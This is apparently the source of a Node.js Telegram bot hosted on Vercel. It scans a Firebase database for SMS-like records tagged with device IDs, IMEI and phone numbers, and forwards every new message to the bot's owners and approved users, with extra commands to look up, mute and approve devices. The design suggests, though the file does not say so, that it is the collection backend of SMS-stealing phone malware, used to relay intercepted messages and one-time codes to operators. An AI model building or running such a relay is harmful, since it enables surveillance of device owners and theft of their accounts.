require("dotenv").config();
const fetch = require("node-fetch");
const crypto = require("crypto");

// ---------------- CONFIG ----------------
const BOT_TOKEN = process.env.BOT_TOKEN || "";

if (!BOT_TOKEN || BOT_TOKEN.trim() === "") {
  console.log("❌ BOT_TOKEN missing! Set it in your .env file.");
  process.exit(1);
}

const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
const OWNER_IDS = (process.env.OWNER_IDS || "")
  .split(",")
  .map((s) => parseInt(s.trim(), 10))
  .filter((n) => !isNaN(n));
const APPROVED_IDS = (process.env.APPROVED_IDS || "")
  .split(",")
  .map((s) => parseInt(s.trim(), 10))
  .filter((n) => !isNaN(n));
const PRIMARY_ADMIN_ID = OWNER_IDS[0] || 0;
const POLL_INTERVAL = 2; // seconds
const MAX_SSE_RETRIES = 5;

// -- VERCEL STATELESS FIX (Optional Hardcoded Values) --
const SINGLE_FIREBASE_URL = process.env.FIREBASE_URL || "";
const SINGLE_ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID ? parseInt(process.env.ADMIN_CHAT_ID, 10) : PRIMARY_ADMIN_ID;
// ----------------------------------------

let OFFSET = null;
let running = true;
const firebaseUrls = {};    // chatId -> firebaseUrl
const watcherIntervals = {}; // chatId -> intervalId
const seenHashes = {};       // chatId -> Set(hash) — backed by Firebase for persistence
const seenHashesLoading = {}; // chatId -> Promise (prevents double-load race condition)
const approvedUsers = new Set([...OWNER_IDS, ...APPROVED_IDS]);
const BOT_START_TIME = Date.now() / 1000;
const SENSITIVE_KEYS = {};
const firebaseCache = {};    // chatId -> firebase snapshot
const cacheTime = {};        // chatId -> last refresh timestamp
const CACHE_REFRESH_SECONDS = 3600; // 1 hour

const mutedDevices = new Set();
let isApprovedUsersLoaded = false; // Flag to check if we loaded from DB

// ---------- UTILITY FUNCTIONS ----------

function htmlEscape(str) {
  if (str == null) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function normalizeJsonUrl(url) {
  if (!url) return null;
  let u = url.replace(/\/+$/, "");
  if (!u.endsWith(".json")) {
    u = u + "/.json";
  }
  return u;
}

async function sendMsg(chatId, text, parseMode = "HTML", replyMarkup = null) {
  async function _sendOne(cid) {
    try {
      const payload = { chat_id: cid, text: text };
      if (parseMode) payload.parse_mode = parseMode;
      if (replyMarkup !== null) payload.reply_markup = replyMarkup;
      await fetch(`${API_URL}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        timeout: 6000, // 6s — must fit within Vercel 10s limit
      });
    } catch (e) {
      console.log(`send_msg -> failed to send to ${cid}: ${e.message}`);
    }
  }

  if (Array.isArray(chatId)) {
    for (const cid of chatId) {
      await _sendOne(cid);
    }
  } else {
    await _sendOne(chatId);
  }
}

async function getUpdates() {
  try {
    const params = new URLSearchParams({ timeout: "20" });
    if (OFFSET !== null) params.set("offset", String(OFFSET));
    const res = await fetch(`${API_URL}/getUpdates?${params}`, { timeout: 30000 });
    const r = await res.json();
    if (r.result && r.result.length > 0) {
      OFFSET = r.result[r.result.length - 1].update_id + 1;
    }
    return r.result || [];
  } catch (e) {
    console.log("get_updates error:", e.message);
    return [];
  }
}

async function httpGetJson(url) {
  try {
    const res = await fetch(url, { timeout: 4000 }); // 4s — fits within Vercel 10s limit
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (e) {
    console.log("http_get_json error for", url, "->", e.message);
    return null;
  }
}

async function httpPutJson(url, data) {
  try {
    const res = await fetch(url, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      timeout: 4000
    });
    return res.ok;
  } catch (e) {
    console.log("http_put_json error:", e.message);
    return false;
  }
}

async function httpDelete(url) {
  try {
    const res = await fetch(url, { method: 'DELETE', timeout: 10000 });
    return res.ok;
  } catch (e) {
    console.log("http_delete error:", e.message);
    return false;
  }
}

function isSmsLike(obj) {
  if (!obj || typeof obj !== "object" || Array.isArray(obj)) return false;
  const keys = new Set(Object.keys(obj).map((k) => k.toLowerCase()));
  let score = 0;
  if (["message", "msg", "body", "text", "sms"].some((k) => keys.has(k))) score += 2;
  if (["from", "sender", "address", "source", "number"].some((k) => keys.has(k))) score += 2;
  if (["time", "timestamp", "ts", "date", "created_at"].some((k) => keys.has(k))) score += 1;
  if (["device", "deviceid", "imei", "device_id", "phoneid"].some((k) => keys.has(k))) score += 1;
  return score >= 3;
}

function findSmsNodes(snapshot, path = "") {
  const found = [];
  if (snapshot && typeof snapshot === "object" && !Array.isArray(snapshot)) {
    for (const [k, v] of Object.entries(snapshot)) {
      const p = path ? `${path}/${k}` : k;
      if (isSmsLike(v)) found.push([p, v]);
      if (v && typeof v === "object") found.push(...findSmsNodes(v, p));
    }
  } else if (Array.isArray(snapshot)) {
    for (let i = 0; i < snapshot.length; i++) {
      const v = snapshot[i];
      const p = `${path}/${i}`;
      if (isSmsLike(v)) found.push([p, v]);
      if (v && typeof v === "object") found.push(...findSmsNodes(v, p));
    }
  }
  return found;
}

function getRawTimestamp(obj) {
  let ts = obj.time || obj.timestamp || obj.date || obj.created_at || null;
  if (!ts) return 0;

  if (typeof ts === "number") {
    return ts < 1e12 ? ts * 1000 : ts;
  }

  if (typeof ts === "string") {
    ts = ts.trim();
    if (/^\d+$/.test(ts)) {
      const num = parseInt(ts, 10);
      return num < 1e12 ? num * 1000 : num;
    }

    // Try parsing "09 Mar 2026, 07:49:02 pm"
    // Regex matches: DD, MMM, YYYY, HH, MM, SS, am/pm
    const dMatch = ts.match(/^(\d{1,2})\s+([A-Za-z]{3})\s+(\d{4}),\s+(\d{1,2}):(\d{2}):(\d{2})\s+(am|pm)/i);
    if (dMatch) {
      let [_, d, m, y, h, min, s, ampm] = dMatch;
      let hr = parseInt(h, 10);
      ampm = ampm.toLowerCase();
      if (ampm === "pm" && hr !== 12) hr += 12;
      if (ampm === "am" && hr === 12) hr = 0;

      const monNames = { "jan": 0, "feb": 1, "mar": 2, "apr": 3, "may": 4, "jun": 5, "jul": 6, "aug": 7, "sep": 8, "oct": 9, "nov": 10, "dec": 11 };
      const monthIdx = monNames[m.toLowerCase()] || 0;

      const dt = new Date(parseInt(y, 10), monthIdx, parseInt(d, 10), hr, parseInt(min, 10), parseInt(s, 10));
      return dt.getTime();
    }

    // Fallback standard parse
    const parsed = Date.parse(ts);
    if (!isNaN(parsed)) return parsed;
  }

  return 0;
}

function extractFields(obj) {
  const device =
    obj.device || obj.deviceId || obj.device_id || obj.imei || obj.id || "Unknown";
  const sender =
    obj.from || obj.sender || obj.address || obj.number || "Unknown";
  const message =
    obj.message || obj.msg || obj.body || obj.text || "";
  let ts =
    obj.time || obj.timestamp || obj.date || obj.created_at || null;

  if (typeof ts === "number") {
    try {
      const d = new Date(ts < 1e12 ? ts * 1000 : ts);
      ts = d.toLocaleString("en-GB", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      });
    } catch {
      ts = String(ts);
    }
  } else if (typeof ts === "string") {
    const digits = ts.replace(/\D/g, "");
    if (digits.length === 10) {
      try {
        const d = new Date(parseInt(digits, 10) * 1000);
        ts = d.toLocaleString("en-GB", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        });
      } catch {
        // keep ts as-is
      }
    }
  }
  if (!ts) {
    ts = new Date().toLocaleString("en-GB", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  }

  const devicePhone = obj.phone || obj.mobile || obj.MobileNumber || null;
  return { device, sender, message, time: ts, device_phone: devicePhone };
}

function computeHash(path, obj) {
  try {
    const data = path + JSON.stringify(obj, Object.keys(obj).sort());
    return crypto.createHash("sha1").update(data).digest("hex");
  } catch {
    return crypto.createHash("sha1").update(path + String(obj)).digest("hex");
  }
}

function formatNotification(fields, userId) {
  const device = htmlEscape(String(fields.device || "Unknown"));
  const sender = htmlEscape(String(fields.sender || "Unknown"));
  const message = htmlEscape(String(fields.message || ""));
  const t = htmlEscape(String(fields.time || ""));
  let text =
    `🆕 <b>New SMS Received</b>\n\n` +
    `📱 Device: <code>${device}</code>\n` +
    `👤 From: <b>${sender}</b>\n` +
    `💬 Message: ${message}\n` +
    `🕐 Time: ${t}\n` +
    `👤 Forwarded by User ID: <code>${userId}</code>`;
  if (fields.device_phone) {
    text += `\n📞 Device Number: <code>${htmlEscape(String(fields.device_phone))}</code>`;
  }
  return text;
}

async function notifyUserOwner(chatId, fields) {
  const deviceId = String(fields.device || "").trim();
  if (mutedDevices.has(deviceId)) return;
  const text = formatNotification(fields, chatId);

  const dests = new Set([chatId, ...OWNER_IDS, ...approvedUsers]);
  await sendMsg([...dests], text);
}

// ---------- FIREBASE POLLING LOGIC (Triggered by Cron) ----------

async function getBaseUrlForApprovals(chatId, baseUrl) {
  return baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
}

async function loadApprovedUsersFromDB(baseUrl) {
  if (isApprovedUsersLoaded) return;
  const dbUrl = await getBaseUrlForApprovals(null, baseUrl);
  const snap = await httpGetJson(`${dbUrl}/approved_users.json`);
  if (snap && typeof snap === 'object') {
    for (const [key, val] of Object.entries(snap)) {
      if (val === true) {
        approvedUsers.add(parseInt(key, 10));
      }
    }
  }
  isApprovedUsersLoaded = true;
}

// Load previously sent hashes from Firebase into memory
async function loadSentHashesFromDB(baseUrl) {
  try {
    const dbUrl = baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
    const snap = await httpGetJson(`${dbUrl}/bot_state/sent_hashes.json`);
    if (snap && typeof snap === 'object') {
      // snap is { "hash1": timestamp, "hash2": timestamp, ... }
      return new Set(Object.keys(snap));
    }
  } catch (e) {
    console.log("loadSentHashesFromDB error:", e.message);
  }
  return new Set();
}

// Batch-save multiple new hashes to Firebase in a single PATCH call (atomic, no race conditions)
async function saveSentHashesToDB(baseUrl, newHashes, existingHashes) {
  if (newHashes.size === 0) return;
  try {
    const dbUrl = baseUrl.replace(/\/+$/, "").replace(/\.json$/, "");
    const hashesNode = `${dbUrl}/bot_state/sent_hashes`;

    // Build a single PATCH payload for all new hashes — atomic single write
    const now = Date.now();
    const payload = {};
    for (const h of newHashes) {
      payload[h] = now;
    }
    // Firebase PATCH = merge update (won't delete existing keys)
    await fetch(`${hashesNode}.json`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      timeout: 10000
    });
  } catch (e) {
    console.log("saveSentHashesToDB error:", e.message);
  }
}

async function pollFirebaseIteration(chatId, baseUrl) {
  // Load approved users on first iteration
  await loadApprovedUsersFromDB(baseUrl);

  let url = baseUrl.replace(/\/+$/, "");
  if (!url.endsWith(".json")) url = url + "/.json";

  // Load sent hashes from Firebase if not already in memory.
  // Use a Promise lock (seenHashesLoading) to prevent a double-load race condition
  // when two cron calls hit the same cold Vercel instance simultaneously.
  let isFirstEverRun = false;
  if (!seenHashes[chatId]) {
    if (!seenHashesLoading[chatId]) {
      console.log(`Loading sent_hashes from Firebase for chatId ${chatId}...`);
      seenHashesLoading[chatId] = loadSentHashesFromDB(baseUrl).then(result => {
        seenHashes[chatId] = result;
        console.log(`Loaded ${seenHashes[chatId].size} hashes from Firebase.`);
      });
    }
    // Wait for load to finish (avoids race if called twice before first load completes)
    await seenHashesLoading[chatId];
    // If Firebase had NO hashes stored, this is truly the first ever run
    if (seenHashes[chatId].size === 0) {
      isFirstEverRun = true;
      console.log("First ever run detected — will silently seed existing messages, no notifications sent.");
    }
  }
  const seen = seenHashes[chatId];

  const snap = await httpGetJson(url);
  if (!snap) return;

  const nodes = findSmsNodes(snap, "");
  const newHashes = new Set(); // Collect all NEW hashes this run

  for (const [path, obj] of nodes) {
    const ts = getRawTimestamp(obj);
    
    // 🔥 BULLETPROOF FIX: Ignore any SMS older than 24 hours OR unparseable timestamps (ts === 0)
    if (ts === 0 || (Date.now() - ts) > 24 * 60 * 60 * 1000) {
      continue;
    }

    const h = computeHash(path, obj);
    if (seen.has(h)) continue; // Already sent — skip!

    // Mark as seen in memory immediately
    seen.add(h);
    newHashes.add(h);

    if (isFirstEverRun) {
      // Silent seed: just collect hash, don't notify (prevents old message flood on first deploy)
      continue;
    }

    // Send the notification
    const fields = extractFields(obj);
    await notifyUserOwner(chatId, fields);
  }

  // Save ALL new hashes to Firebase in a single atomic PATCH call
  // This is the KEY fix: one reliable write instead of many small writes that can fail
  if (newHashes.size > 0) {
    await saveSentHashesToDB(baseUrl, newHashes, seen);
    console.log(`Saved ${newHashes.size} new hash(es) to Firebase.`);
  }
}

// ---------- START / STOP ----------
async function startWatcher(chatId, baseUrl) {
  firebaseUrls[chatId] = baseUrl;
  // Load existing sent hashes from Firebase (don't reset to empty Set!)
  // Resetting to empty would cause all old messages to be re-sent
  if (!seenHashes[chatId]) {
    console.log(`startWatcher: Loading sent_hashes from Firebase for chatId ${chatId}...`);
    seenHashes[chatId] = await loadSentHashesFromDB(baseUrl);
    console.log(`startWatcher: Loaded ${seenHashes[chatId].size} hashes.`);
  }

  // Also seed current Firebase contents silently (catch-up without notification)
  const jsonUrl = normalizeJsonUrl(baseUrl);
  const snap = await httpGetJson(jsonUrl);
  if (snap) {
    const newSeed = new Set();
    for (const [p, o] of findSmsNodes(snap, "")) {
      const h = computeHash(p, o);
      if (!seenHashes[chatId].has(h)) {
        seenHashes[chatId].add(h);
        newSeed.add(h);
      }
    }
    if (newSeed.size > 0) {
      await saveSentHashesToDB(baseUrl, newSeed, seenHashes[chatId]);
    }
  }

  await sendMsg(chatId, "✅ Monitoring started. You will receive alerts too.");
  refreshFirebaseCache(chatId);
}

function stopWatcher(chatId) {
  delete firebaseUrls[chatId];
  delete seenHashes[chatId];
  sendMsg(chatId, "🛑 Monitoring stopped.");
}

// ---------- APPROVAL HELPERS ----------
function isOwner(userId) {
  return OWNER_IDS.includes(userId);
}

function isApproved(userId) {
  return approvedUsers.has(userId) || isOwner(userId);
}

async function handleNotApproved(chatId, msg) {
  const fromUser = msg.from || {};
  const firstName = fromUser.first_name || "";
  const username = fromUser.username || null;
  const replyMarkup = {
    inline_keyboard: [
      [
        {
          text: "📨 Contact Admin",
          url: `tg://user?id=${PRIMARY_ADMIN_ID}`,
        },
      ],
    ],
  };
  const userInfoLines = [
    "❌ You are not approved to use this bot yet.",
    "",
    "Tap the button below to contact admin for access.",
    "",
    `🆔 Your User ID: <code>${chatId}</code>`,
  ];
  if (username) {
    userInfoLines.push(`👤 Username: @${htmlEscape(username)}`);
  }
  await sendMsg(chatId, userInfoLines.join("\n"), "HTML", replyMarkup);
  const ownerText = [
    "⚠️ New user tried to use the bot:",
    `ID: <code>${chatId}</code>`,
    `Name: ${htmlEscape(firstName)}`,
  ];
  if (username) {
    ownerText.push(`Username: @${htmlEscape(username)}`);
  }
  ownerText.push("");
  ownerText.push(`Approve with: <code>/approve ${chatId}</code>`);
  await sendMsg(OWNER_IDS, ownerText.join("\n"));
}

function formatUptime(seconds) {
  seconds = Math.floor(seconds);
  const days = Math.floor(seconds / 86400);
  seconds %= 86400;
  const hours = Math.floor(seconds / 3600);
  seconds %= 3600;
  const minutes = Math.floor(seconds / 60);
  seconds %= 60;
  const parts = [];
  if (days) parts.push(`${days}d`);
  if (hours) parts.push(`${hours}h`);
  if (minutes) parts.push(`${minutes}m`);
  parts.push(`${seconds}s`);
  return parts.join(" ");
}

// ---------- SAFE DEVICE SEARCH ----------
function maskNumber(value, keepLast = 2) {
  if (!value) return "";
  const s = String(value).replace(/\D/g, "");
  if (s.length <= keepLast) return "*".repeat(s.length);
  return "*".repeat(s.length - keepLast) + s.slice(-keepLast);
}

function searchRecordsByDevice(snapshot, deviceId, path = "") {
  const matches = [];
  if (snapshot && typeof snapshot === "object" && !Array.isArray(snapshot)) {
    for (const [k, v] of Object.entries(snapshot)) {
      const p = path ? `${path}/${k}` : k;
      if (String(k) === String(deviceId) && v && typeof v === "object" && !Array.isArray(v)) {
        matches.push(v);
      }
      if (v && typeof v === "object" && !Array.isArray(v)) {
        const did = v.DeviceId || v.deviceId || v.device_id || v.DeviceID;
        if (did && String(did) === String(deviceId)) {
          matches.push(v);
        }
      }
      if (v && typeof v === "object") {
        matches.push(...searchRecordsByDevice(v, deviceId, p));
      }
    }
  } else if (Array.isArray(snapshot)) {
    for (let i = 0; i < snapshot.length; i++) {
      const v = snapshot[i];
      const p = `${path}/${i}`;
      if (v && typeof v === "object" && !Array.isArray(v)) {
        const did = v.DeviceId || v.deviceId || v.device_id || v.DeviceID;
        if (did && String(did) === String(deviceId)) {
          matches.push(v);
        }
      }
      if (v && typeof v === "object") {
        matches.push(...searchRecordsByDevice(v, deviceId, p));
      }
    }
  }
  return matches;
}

function safeFormatDeviceRecord(rec) {
  const lines = ["🔍 <b>Record found for this device</b>", ""];
  for (const [k, v] of Object.entries(rec)) {
    const keyLower = String(k).toLowerCase();
    let showVal;
    if (SENSITIVE_KEYS[keyLower]) {
      const masked = maskNumber(v, 2);
      showVal = `${masked} (hidden)`;
    } else {
      showVal = typeof v === 'object' && v !== null ? JSON.stringify(v).replace(/"/g, "'") : String(v);
    }
    lines.push(`<b>${htmlEscape(String(k))}</b>: <code>${htmlEscape(showVal)}</code>`);
  }
  lines.push("");
  lines.push("⚠️ Highly sensitive fields are masked for security.");
  return lines.join("\n");
}

// ---------- SAFE DEVICE SEARCH ----------
async function refreshFirebaseCache(chatId) {
  const baseUrl = firebaseUrls[chatId];
  if (!baseUrl) return;
  const snap = await httpGetJson(normalizeJsonUrl(baseUrl));
  if (snap === null) return;
  firebaseCache[chatId] = snap;
  cacheTime[chatId] = Date.now() / 1000;
  try {
    await sendMsg(chatId, "♻️ Firebase cache refreshed automatically.");
    await sendMsg(OWNER_IDS, `♻️ Firebase cache refreshed for user <code>${chatId}</code>`);
  } catch {
    // ignore
  }
}

function startCacheRefresherLoop() {
  setInterval(async () => {
    const now = Date.now() / 1000;
    for (const cid of Object.keys(firebaseUrls)) {
      if (now - (cacheTime[cid] || 0) >= CACHE_REFRESH_SECONDS) {
        await refreshFirebaseCache(cid);
      }
    }
  }, 60 * 1000);
}

// ---------- COMMAND HANDLING ----------
async function handleUpdate(u) {
  const msg = u.message || {};
  const chat = msg.chat || {};
  const chatId = chat.id;
  let text = (msg.text || "").trim();

  if (!chatId || !text) return;

  // Reply-based /find shortcut
  if (text.toLowerCase() === "/find" && msg.reply_to_message) {
    const reply = msg.reply_to_message;
    for (const line of (reply.text || "").split("\n")) {
      if (line.includes("Device:")) {
        text = "/find " + line.split("Device:")[1].trim();
        break;
      }
    }
  }

  const lowerText = text.toLowerCase();

  // FIRST: approval check
  if (!isApproved(chatId)) {
    await handleNotApproved(chatId, msg);
    return;
  }

  // /start
  if (lowerText === "/start") {
    await sendMsg(
      chatId,
      "👋 Welcome!\n\n" +
      "You are approved to use this bot.\n\n" +
      "User Commands:\n" +
      "• /start - show this message\n" +
      "• /stop - stop your monitoring\n" +
      "• /find <device_id> - search record by device id (safe summary only)\n" +
      "• /ping - bot status & ping\n" +
      "• /mute <device_id> - mute a specific device\n" +
      "• /unmute <device_id> - unmute a specific device\n" +
      "\nAdmin Commands (owners only):\n" +
      "• /adminlist - show active Firebase URL\n" +
      "• /approve <user_id> - permanently approve user\n" +
      "• /unapprove <user_id> - permanently unapprove user\n" +
      "• /approvedlist - show approved users"
    );
    return;
  }

  // /ping - bot status
  if (lowerText === "/ping") {
    const uptimeSec = Math.floor(Date.now() / 1000 - BOT_START_TIME);
    const uptimeStr = formatUptime(uptimeSec);
    const monitoredCount = Object.keys(firebaseUrls).length;
    const approvedCount = approvedUsers.size;
    const statusText =
      "🏓 <b>Pong!</b>\n\n" +
      "✅ Bot is <b>online</b> and responding.\n\n" +
      `⏱ Uptime: <code>${uptimeStr}</code>\n` +
      `📡 Active monitors: <code>${monitoredCount}</code>\n` +
      `👥 Approved users: <code>${approvedCount}</code>\n`;
    await sendMsg(chatId, statusText);
    return;
  }

  // /stop
  if (lowerText === "/stop") {
    stopWatcher(chatId);
    return;
  }

  // ADMIN VIEW: /adminlist
  if (lowerText === "/adminlist") {
    if (!isOwner(chatId)) {
      await sendMsg(chatId, "❌ This command is only for bot owners.");
      return;
    }
    if (SINGLE_FIREBASE_URL) {
      await sendMsg(
        chatId,
        "👑 <b>Active Firebase URL (from .env)</b>:\n\n" + `<code>${htmlEscape(String(SINGLE_FIREBASE_URL))}</code>`
      );
    } else {
      await sendMsg(chatId, "❌ FIREBASE_URL is not set in your .env file.");
    }
    return;
  }

  // -------- Owner-only approval commands --------
  if (lowerText.startsWith("/approve")) {
    if (!isOwner(chatId)) {
      await sendMsg(chatId, "❌ Only owners can approve users.");
      return;
    }
    const parts = text.split(/\s+/);
    if (parts.length < 2) {
      await sendMsg(chatId, "Usage: <code>/approve user_id</code>");
      return;
    }
    const targetId = parseInt(parts[1], 10);
    if (isNaN(targetId)) {
      await sendMsg(chatId, "❌ Invalid user ID.");
      return;
    }

    approvedUsers.add(targetId);
    if (SINGLE_FIREBASE_URL) {
      const dbUrl = await getBaseUrlForApprovals(chatId, SINGLE_FIREBASE_URL);
      await httpPutJson(`${dbUrl}/approved_users/${targetId}.json`, true);
    }

    await sendMsg(chatId, `✅ User <code>${targetId}</code> approved and saved permanently.`);
    await sendMsg(targetId, "✅ You have been approved to use this bot.");
    return;
  }

  if (lowerText.startsWith("/unapprove")) {
    if (!isOwner(chatId)) {
      await sendMsg(chatId, "❌ Only owners can unapprove users.");
      return;
    }
    const parts = text.split(/\s+/);
    if (parts.length < 2) {
      await sendMsg(chatId, "Usage: <code>/unapprove user_id</code>");
      return;
    }
    const targetId = parseInt(parts[1], 10);
    if (isNaN(targetId)) {
      await sendMsg(chatId, "❌ Invalid user ID.");
      return;
    }
    if (OWNER_IDS.includes(targetId)) {
      await sendMsg(chatId, "❌ Cannot unapprove an owner.");
      return;
    }

    if (approvedUsers.has(targetId)) {
      approvedUsers.delete(targetId);
      if (SINGLE_FIREBASE_URL) {
        const dbUrl = await getBaseUrlForApprovals(chatId, SINGLE_FIREBASE_URL);
        await httpDelete(`${dbUrl}/approved_users/${targetId}.json`);
      }
      await sendMsg(chatId, `🚫 User <code>${targetId}</code> unapproved and removed from permanent database.`);
    } else {
      await sendMsg(chatId, `ℹ️ User <code>${targetId}</code> was not approved.`);
    }
    return;
  }

  if (lowerText === "/approvedlist") {
    if (!isOwner(chatId)) {
      await sendMsg(chatId, "❌ Only owners can see approved list.");
      return;
    }
    if (approvedUsers.size === 0) {
      await sendMsg(chatId, "No approved users yet.");
      return;
    }
    const lines = [];
    for (const uid of [...approvedUsers].sort((a, b) => a - b)) {
      const tag = OWNER_IDS.includes(uid) ? " (owner)" : "";
      lines.push(`👤 <code>${uid}</code>${tag}`);
    }
    await sendMsg(chatId, "✅ <b>Approved users</b>:\n\n" + lines.join("\n"));
    return;
  }

  // -------- DEVICE MUTE --------
  if (lowerText.startsWith("/mute")) {
    const parts = text.split(/\s+(.+)/);
    if (parts.length < 2 || !parts[1]) {
      await sendMsg(chatId, "Usage: <code>/mute device_id</code>");
      return;
    }
    mutedDevices.add(parts[1].trim());
    await sendMsg(chatId, `🔕 Muted device: <code>${htmlEscape(parts[1])}</code>`);
    return;
  }

  if (lowerText.startsWith("/unmute")) {
    const parts = text.split(/\s+(.+)/);
    if (parts.length < 2 || !parts[1]) {
      await sendMsg(chatId, "Usage: <code>/unmute device_id</code>");
      return;
    }
    mutedDevices.delete(parts[1].trim());
    await sendMsg(chatId, `🔔 Unmuted device: <code>${htmlEscape(parts[1])}</code>`);
    return;
  }

  // -------- /find <device_id> (safe) --------
  if (lowerText.startsWith("/find")) {
    const parts = text.split(/\s+(.+)/);
    if (parts.length < 2 || !parts[1] || !parts[1].trim()) {
      await sendMsg(chatId, "Usage: <code>/find device_id</code>");
      return;
    }
    const deviceId = parts[1].trim();
    if (!SINGLE_FIREBASE_URL) {
      await sendMsg(
        chatId,
        "❌ FIREBASE_URL is not set in your .env file."
      );
      return;
    }
    const jsonUrl = normalizeJsonUrl(SINGLE_FIREBASE_URL);
    const snap = await httpGetJson(jsonUrl);
    if (snap === null) {
      await sendMsg(chatId, "❌ Failed to fetch data from your Firebase.");
      return;
    }
    const matches = searchRecordsByDevice(snap, deviceId);
    if (matches.length === 0) {
      await sendMsg(chatId, "🔍 No record found for this device id.");
      return;
    }
    const maxShow = 3;
    for (const rec of matches.slice(0, maxShow)) {
      await sendMsg(chatId, safeFormatDeviceRecord(rec));
    }
    if (matches.length > maxShow) {
      await sendMsg(
        chatId,
        `ℹ️ ${matches.length} records matched, showing first ${maxShow} only.`
      );
    }
    return;
  }

  // -------- Firebase URL handling (Disabled, relying on .env) --------
  if (text.startsWith("http")) {
    await sendMsg(
      chatId,
      "ℹ️ Sending links here is disabled. The bot gets its Firebase URL directly from the `FIREBASE_URL` variable in your `.env` or Vercel settings."
    );
    return;
  }

  // Fallback help
  await sendMsg(
    chatId,
    "User Commands:\n" +
    "• /start - instructions\n" +
    "• /stop - stop your monitoring\n" +
    "• /find <device_id> - search record by device id (safe summary only)\n" +
    "• /ping - bot status & ping\n" +
    "• /mute <device_id> - mute a specific device\n" +
    "• /unmute <device_id> - unmute a specific device\n" +
    "\nAdmin Commands:\n" +
    "• /adminlist - show active Firebase URL\n" +
    "• /approve <user_id> - permanently approve user\n" +
    "• /unapprove <user_id> - permanently unapprove user\n" +
    "• /approvedlist - show approved users"
  );
}

// ---------- MAIN LOOP ----------
async function mainLoop() {
  await sendMsg(OWNER_IDS, "Bot started and running.");
  console.log("Bot running. Listening for messages...");
  while (running) {
    const updates = await getUpdates();
    for (const u of updates) {
      try {
        await handleUpdate(u);
      } catch (e) {
        console.log("handle_update error:", e.message);
      }
    }
    await new Promise((r) => setTimeout(r, 500));
  }
}

// ---------- WEBHOOK AND SERVER (VERCEL SUPPORT) ----------
const express = require("express");
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("Telegram Bot is running! Use Webhooks to receive updates.");
});

// The endpoint Telegram will hit with updates
app.post("/webhook", async (req, res) => {
  try {
    // On cold start, load approved users from Firebase before handling any command
    if (!isApprovedUsersLoaded && SINGLE_FIREBASE_URL) {
      await loadApprovedUsersFromDB(SINGLE_FIREBASE_URL);
    }
    await handleUpdate(req.body);
  } catch (err) {
    console.error("handleUpdate error:", err.message);
  }
  // Always respond 200 AFTER processing so sendMsg completes before Vercel closes the function
  res.sendStatus(200);
});

// Helper to set Webhook dynamically (Call this manually once or via Vercel deploy hook if URL is known)
app.get("/set_webhook", async (req, res) => {
  const domain = req.query.url; // e.g. https://my-vercel-app.vercel.app
  if (!domain) {
    return res.send("Please provide a ?url= query parameter with your Vercel domain.");
  }
  const webhookUrl = `${domain}/webhook`;
  try {
    const response = await fetch(`${API_URL}/setWebhook?url=${webhookUrl}`);
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// CRON Endpoint for Vercel: Ping this URL every 1 minute via cron-job.org
app.get("/cron", async (req, res) => {
  let polledCount = 0;
  
  try {
    // Approach 1: Stateless check (Using Hardcoded Firebase URL from .env)
    if (SINGLE_FIREBASE_URL && SINGLE_ADMIN_CHAT_ID) {
      await pollFirebaseIteration(SINGLE_ADMIN_CHAT_ID, SINGLE_FIREBASE_URL);
      polledCount++;
    }

    // Approach 2: Stateful check (In-memory users, if any)
    const activeChats = Object.keys(firebaseUrls);
    for (const chatId of activeChats) {
      if (SINGLE_ADMIN_CHAT_ID == chatId && SINGLE_FIREBASE_URL == firebaseUrls[chatId]) continue;
      await pollFirebaseIteration(chatId, firebaseUrls[chatId]);
      polledCount++;
    }
    
    // Respond AFTER all work is done. Vercel kills functions immediately upon res.send()
    res.status(200).send(`Cron executed: Polled ${polledCount} Firebase databases.`);
  } catch (err) {
    console.error("Cron polling error:", err.message);
    res.status(500).send(`Cron error: ${err.message}`);
  }
});

app.listen(PORT, () => {
  console.log(`Web server is listening on port ${PORT}`);
  // Start the cache refresher only after server starts
  startCacheRefresherLoop();
});

module.exports = app;
